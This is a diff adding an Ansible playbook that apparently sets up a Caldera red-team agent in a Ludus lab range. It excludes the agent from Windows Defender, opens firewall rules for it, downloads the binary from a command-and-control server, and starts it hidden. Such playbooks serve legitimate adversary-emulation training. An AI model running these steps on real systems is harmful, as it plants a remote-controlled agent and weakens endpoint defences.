@@ -1,0 +1,42 @@
+---
+- name: Check if agent exist
+  ansible.windows.win_stat:
+    path: "{{ ludus_caldera_windows_agent_name}}"
+  register: agent_exe
+
+- name: Exclude agent from defender
+  ansible.windows.win_powershell:
+    script: |
+      Add-MpPreference -ExclusionPath "{{ ludus_caldera_windows_agent_name}}";
+      Add-MpPreference -ExclusionProcess "{{ ludus_caldera_windows_agent_name}}";
+  when: not agent_exe.stat.exists
+
+- name: Enable firewall
+  ansible.windows.win_powershell:
+    script: |
+      New-NetFirewallRule -DisplayName "Caldera Agent Outbound" -Direction Outbound -Program "{{ ludus_caldera_windows_agent_name }}" -Action Allow  -Profile Any -Enabled True;
+      New-NetFirewallRule -DisplayName "Caldera Agent Inbound" -Direction Inbound -Program "{{ ludus_caldera_windows_agent_name }}" -Action Allow -Profile Any -Enabled True;
+  when: not agent_exe.stat.exists
+
+- name: Install agent
+  ansible.windows.win_powershell:
+    script: |
+      $server="http://10.{{ range_second_octet }}.{{ ludus_caldera_vm.vlan }}.{{ ludus_caldera_vm.ip_last_octet }}:8888";
+      $url="$server/file/download";
+      $wc=New-Object System.Net.WebClient;
+      $wc.Headers.add("platform","windows");
+      $wc.Headers.add("file","sandcat.go");
+      $data=$wc.DownloadData($url);
+      get-process | ? {$_.modules.filename -like "{{ ludus_caldera_windows_agent_name}}"} | stop-process -f;
+      rm -force "{{ ludus_caldera_windows_agent_name}}" -ea ignore;
+      [io.file]::WriteAllBytes("{{ ludus_caldera_windows_agent_name }}",$data) | Out-Null;
+  when: not agent_exe.stat.exists
+
+- name: Start agent
+  ansible.windows.win_powershell:
+    script: |
+      $server="http://10.{{ range_second_octet }}.{{ ludus_caldera_vm.vlan }}.{{ ludus_caldera_vm.ip_last_octet }}:8888";
+      get-process | ? {$_.modules.filename -like "{{ ludus_caldera_windows_agent_name}}"} | stop-process -f;
+      Start-Process -FilePath "{{ ludus_caldera_windows_agent_name }}" -ArgumentList "-server $server -group red" -WindowStyle hidden;
+  async: 180
+  poll: 0
